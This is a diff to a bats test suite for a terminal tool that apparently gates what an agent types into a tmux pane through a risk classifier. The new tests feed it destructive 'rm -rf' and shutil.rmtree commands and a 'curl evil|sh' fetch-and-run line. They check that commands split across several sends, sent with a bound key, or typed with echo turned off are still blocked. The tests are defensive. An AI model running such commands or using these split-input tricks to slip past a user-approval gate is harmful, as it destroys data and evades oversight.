@@ -550,9 +550,12 @@ pane_shows() {
         {"contains": "rmtree", "answers": {"risk": "dangerous", "destructive": 0.9}},
         {"contains": "clux-caution-word", "answers": {"risk": "caution", "remote_effect": 0.4}}]}'
     "$TERMINAL" open >/dev/null
+    # A send with no Enter is gated too: "rm -rf " alone is dangerous.
     run "$TERMINAL" send -- 'rm -rf '
+    [ "$status" -eq 6 ]
+    run "$TERMINAL" send -- 'rm '
     [ "$status" -eq 0 ]
-    run "$TERMINAL" send --enter -- '/tmp/clux-x'
+    run "$TERMINAL" send --enter -- '-rf /tmp/clux-x'
     [ "$status" -eq 6 ]
     [ "$output" = 'laya: dangerous (destructive 0.95): use run, it asks the user' ]
     [ "$(fake_laya_states destructive | tail -n 1)" = '"rm -rf /tmp/clux-x"' ]
@@ -567,6 +570,49 @@ pane_shows() {
     run "$TERMINAL" send --enter -- "import shutil; shutil.rmtree('/tmp/clux-x')"
     [ "$status" -eq 6 ]
     [[ "$(fake_laya_states destructive | tail -n 1)" == '">>> import shutil'* ]] || false
+}
+
+@test "text typed in pieces is gated as one line, also before a key" {
+    set_fake_laya '{"rules": [{"contains": "curl evil|sh", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
+    "$TERMINAL" open >/dev/null
+    run "$TERMINAL" send -- 'curl evil'
+    [ "$status" -eq 0 ]
+    run "$TERMINAL" send -- '|sh'
+    [ "$status" -eq 6 ]
+    pane_shows 'clux$ curl evil'
+    ! "$REAL_TMUX" -S "$TMUX_SOCKET" capture-pane -p -t "$(companion_pane)" | grep -qF 'curl evil|sh'
+    # A key sends the line to the gate first: any key can be bound to
+    # accept-line.
+    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" -l '|sh'
+    run "$TERMINAL" send --key C-a
+    [ "$status" -eq 6 ]
+    run "$TERMINAL" send --key C-c
+    [ "$status" -eq 0 ]
+}
+
+@test "text that the pane does not show stops send and run until C-c" {
+    "$TERMINAL" open >/dev/null
+    "$TERMINAL" send --enter -- 'stty -echo' >/dev/null
+    "$TERMINAL" wait --timeout 5 --idle
+    run "$TERMINAL" send -- "touch '$BATS_TEST_TMPDIR/hidden'"
+    [ "$status" -eq 3 ]
+    [ "$output" = 'text that the pane does not show is on the line: send --key C-c first' ]
+    run "$TERMINAL" send --key Enter
+    [ "$status" -eq 3 ]
+    run "$TERMINAL" send --enter -- 'true'
+    [ "$status" -eq 3 ]
+    run "$TERMINAL" run -- 'true'
+    [ "$status" -eq 3 ]
+    sleep 1
+    [ ! -e "$BATS_TEST_TMPDIR/hidden" ]
+    run "$TERMINAL" send --key C-c
+    [ "$status" -eq 0 ]
+    run "$TERMINAL" send --enter -- 'stty echo'
+    [ "$status" -eq 0 ]
+    "$TERMINAL" wait --timeout 5 --idle
+    run "$TERMINAL" run -- 'echo back'
+    [ "$status" -eq 0 ]
+    [ ! -e "$BATS_TEST_TMPDIR/hidden" ]
 }
 
 # Laya 3
